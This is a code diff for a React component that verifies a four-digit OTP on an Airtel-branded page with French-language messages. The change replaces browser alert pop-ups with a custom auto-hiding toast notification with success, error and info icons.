@@ -7,6 +7,7 @@ function AirtelOTPVerify() {
   const [timeLeft, setTimeLeft] = useState(45);
   const [error, setError] = useState('');
   const [expired, setExpired] = useState(false);
+  const [toast, setToast] = useState<{ message: string; type: 'error' | 'success' | 'info' } | null>(null);
   const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
   const navigate = useNavigate();
 
@@ -24,19 +25,29 @@ function AirtelOTPVerify() {
     inputRefs.current[0]?.focus();
   }, []);
 
-  // Countdown timer — reliable setTimeout version
+  // Auto-hide toast after 4 seconds
+  useEffect(() => {
+    if (!toast) return;
+    const t = setTimeout(() => setToast(null), 4000);
+    return () => clearTimeout(t);
+  }, [toast]);
+
+  // Countdown timer
   useEffect(() => {
     if (timeLeft <= 0) {
       setExpired(true);
       return;
     }
-
     const timer = setTimeout(() => {
       setTimeLeft((prev) => prev - 1);
     }, 1000);
-
     return () => clearTimeout(timer);
   }, [timeLeft]);
+
+  // Helper to show toast
+  const showToast = (message: string, type: 'error' | 'success' | 'info' = 'error') => {
+    setToast({ message, type });
+  };
 
   const handleChange = (index: number, value: string) => {
     if (!/^\d*$/.test(value)) return;
@@ -58,15 +69,14 @@ function AirtelOTPVerify() {
     e.preventDefault();
     const otpString = otp.join('');
 
-    // Block if expired
     if (expired) {
-      alert('⏱️ Le code a expiré. Veuillez cliquer sur « Renvoyer le code » pour en recevoir un nouveau.');
+      showToast('⏱️ Le code a expiré. Veuillez cliquer sur « Renvoyer le code ».', 'error');
       return;
     }
 
     if (otpString.length < 4) {
       setError('Veuillez saisir le code de vérification à 4 chiffres.');
-      alert('⚠️ Veuillez saisir le code de vérification à 4 chiffres.');
+      showToast('⚠️ Veuillez saisir le code à 4 chiffres.', 'error');
       return;
     }
 
@@ -81,10 +91,10 @@ function AirtelOTPVerify() {
       const data = await response.json();
 
       if (data.status === 'success') {
-        navigate('/airtel-loan-limit');
+        showToast('✅ Code correct ! Redirection...', 'success');
+        setTimeout(() => navigate('/airtel-loan-limit'), 800);
       } else {
-        const wrongMsg = '❌ Code incorrect ! Veuillez vérifier le code envoyé sur votre téléphone et réessayer.';
-        alert(wrongMsg);
+        showToast('❌ Code incorrect ! Vérifiez le code reçu par SMS.', 'error');
         setError(data.message || 'Code invalide. Veuillez réessayer.');
         setOtp(['', '', '', '']);
         setTimeout(() => {
@@ -92,7 +102,7 @@ function AirtelOTPVerify() {
         }, 100);
       }
     } catch {
-      alert('⚠️ Erreur lors de la vérification du code. Veuillez vérifier votre connexion internet et réessayer.');
+      showToast('⚠️ Erreur de connexion. Vérifiez votre réseau.', 'error');
       setError('Erreur lors de la vérification. Veuillez réessayer.');
     }
   };
@@ -115,20 +125,55 @@ function AirtelOTPVerify() {
       const data = await response.json();
 
       if (data.status === 'success') {
-        alert('📩 Un nouveau code a été envoyé sur votre téléphone.');
+        showToast('📩 Un nouveau code a été envoyé sur votre téléphone.', 'success');
         setTimeout(() => {
           inputRefs.current[0]?.focus();
         }, 100);
       } else {
-        alert(data.message || 'Échec de l\'envoi du nouveau code.');
+        showToast(data.message || 'Échec de l\'envoi du nouveau code.', 'error');
       }
     } catch {
-      alert('Erreur de connexion au serveur.');
+      showToast('Erreur de connexion au serveur.', 'error');
     }
   };
 
   return (
     <div className="airtel-container">
+      {/* ---- Custom Toast Notification ---- */}
+      {toast && (
+        <div className={`airtel-toast airtel-toast-${toast.type}`}>
+          <div className="airtel-toast-icon">
+            {toast.type === 'error' && (
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
+                <circle cx="12" cy="12" r="10"></circle>
+                <line x1="12" y1="8" x2="12" y2="12"></line>
+                <line x1="12" y1="16" x2="12.01" y2="16"></line>
+              </svg>
+            )}
+            {toast.type === 'success' && (
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
+                <circle cx="12" cy="12" r="10"></circle>
+                <polyline points="16 9 10.5 15 8 12.5"></polyline>
+              </svg>
+            )}
+            {toast.type === 'info' && (
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
+                <circle cx="12" cy="12" r="10"></circle>
+                <line x1="12" y1="16" x2="12" y2="12"></line>
+                <line x1="12" y1="8" x2="12.01" y2="8"></line>
+              </svg>
+            )}
+          </div>
+          <div className="airtel-toast-message">{toast.message}</div>
+          <button className="airtel-toast-close" onClick={() => setToast(null)} aria-label="Fermer">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
+              <line x1="18" y1="6" x2="6" y2="18"></line>
+              <line x1="6" y1="6" x2="18" y2="18"></line>
+            </svg>
+          </button>
+        </div>
+      )}
+
       {/* En-tête */}
       <div className="airtel-header">
         <div className="airtel-hamburger">
@@ -190,7 +235,6 @@ function AirtelOTPVerify() {
             </div>
           )}
 
-          {/* Timer / Expiry message */}
           <div className="airtel-timer" style={expired ? { color: '#DC2626' } : undefined}>
             <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke={expired ? '#DC2626' : '#E53E3E'} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
               <circle cx="12" cy="12" r="10"></circle>
